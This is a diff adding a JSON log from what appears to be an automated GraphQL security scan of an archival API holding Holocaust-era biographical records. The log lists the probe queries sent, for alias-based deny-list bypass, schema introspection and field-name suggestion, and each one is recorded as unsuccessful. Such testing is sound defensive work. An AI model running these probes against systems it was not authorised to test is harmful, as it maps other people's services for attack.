+                            "biographicalHistory": "Born 1898 in \u010cesk\u00fd Krumlov. Died 1956 in Jind\u0159ich\u016fv Hradec. Engineer in a textile factory. Studied at technical university in Vienna. During WWI he served in Galicia. Worked in Southern Bohemia in a textile factory. During WWII he worked for the Jewish Community in Prague at the Jewish Labour Department. Deported to Terez\u00edn in February 1945. After the war he returned to work in the same textile factory."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1903 in Slovansk\u00e9 Lhota. Died in 1950. Worked for the Electrical Utilities of Prague as driver and ticket collector. Was a football referee. During WWII employee of the Jewish Community in Prague, not certain of what department. Unsuccessfully tried to emigrate to Shanghai. He was not deported due to his (so-called) mixed marriage with Bo\u017eena Hlav\u00e1\u010dkov\u00e1. In 1947 changed family surname to J\u00e1nsk\u00fd."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1899. Died 1944 in Auschwitz. Baroness Franti\u0161ka Gutmannov\u00e1 (ne\u00e9 Mayov\u00e1) was the wife of the industrial magnate Vil\u00e9m Gutmann, co-owner of Gebr\u00fcder Gutmann. Amongst other things, this company owned coal mines in Upper Silesia and, with the Rothschilds, founded what is now the V\u00edtkovice Ironworks. Vil\u00e9m Gutmann emigrated before the outbreak of war. Franti\u0161ka remained alone in Prague with her four children Eli\u0161ka, Zuzana, Gertruda and Franti\u0161ek. During WWII she worked for the Jewish Community in Prague, in the stock of the Treuhandstelle. In the summer of 1944, together with her children, she was arrested by the Gestapo unknown reasons. After being inprisoned in Prague's Pankr\u00e1c Prison and the Small Fortress in Terez\u00edn, they were all \u2013 with the exception of Franti\u0161ek who had died five days earlier \u2013 sent to Auschwitz in October 1944. According to available information, Eli\u0161ka was the only one to survive."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1903 in Prague. Died in the 1950s. Civil servant. Unsuccessfully tried to get visa to USA. From 1944 worked at workshop of the Council of the Elders in Prague. Deported to Terez\u00edn in February 1945."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1913 in Prague. Died 1996. Lawyer. During WWII an employee of the Jewish Community in Prague. One of the leading figure of the Prague\u00b4s lawyer community after WWII. 1948 - 1954 was the head of the political section of the President\u00b4s Office. Worked as a professor at the Faculty of Law of the Charles University in Prague (1951-1990s). Member of the Federal Assembly until 1971."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1877 in Byst\u0159ice pod Host\u00fdnem (Czech Republic). Died 1938 in Dachau. Ehrlich was a Zionist and later represented the Jewish Community in Vienna to the Austro-fascist government. He was transported with the so-called \"Prominententransport\" (prominent people's transport) to Dachau immediately after the Anschluss where he was executed some weeks later."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1894 in Mikulov (Nikolsburg). Feldsberg studied law in Vienna and also worked for the Jewish Community in Vienna from November 1938 onwards. Feldberg became head of the Cemetary Department of the Jewish Community. In 1943 he was transported to Terez\u00edn together with his wife, where he survived. Between 1963 and 1970 Ernst Feldsberg was Head of the Jewish Community in Vienna."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1881. Died 1958. Emil Engel was a member of the board of the Jewish Community in Vienna from 1926. Between 1928 and 1940 Engel was head of the Social Welfare Department. Engel emigrated to the United States in 1940."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1875 in Vienna. Died 1954 in Vienna. Officer in the Austrian-Hungarian Army. President of the Higher Regional Court in Vienna. Professor for civil law. Chief judge of the Ghetto Court in Terez\u00edn. Member of the Council of the Elders of the Jews in Terez\u00edn. Transported to Terez\u00edn in September 1942. Survived."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1904 in Jihlava. Died 1970. During WWII worked at the Jewish Community in Prague, officer at the Legal and Information Service Department, later Head of the Department. He was not deported due to his (so-called) mixed marriage."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                }
+              ]
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.699,
+        "timestamp": "2025-10-06T02:20:10.778603Z",
+        "response_body": {
+          "data": {
+            "s1": {
+              "items": [
+                {
+                  "id": "ehri_cb"
+                },
+                {
+                  "id": "ehri_pers"
+                },
+                {
+                  "id": "terezin-victims"
+                },
+                {
+                  "id": "terezin-persons"
+                },
+                {
+                  "id": "jc-persons"
+                }
+              ]
+            },
+            "s2": {
+              "items": [
+                {
+                  "id": "ehri_cb"
+                },
+                {
+                  "id": "ehri_pers"
+                },
+                {
+                  "id": "terezin-victims"
+                },
+                {
+                  "id": "terezin-persons"
+                },
+                {
+                  "id": "jc-persons"
+                }
+              ]
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-06T02:20:10.778724Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.46,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets {\n    types {\n      name\n      fields {\n        name\n        type {\n          name\n          kind\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.459,
+    "timestamp": "2025-10-06T02:20:14.240824Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[authoritativeSets/types]) : Field 'types' in type 'authoritativeSets' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets(first: 10) {\n    itemz {\n      id\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.089,
+    "timestamp": "2025-10-06T02:20:18.315791Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[authoritativeSets/itemz]) : Field 'itemz' in type 'authoritativeSets' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
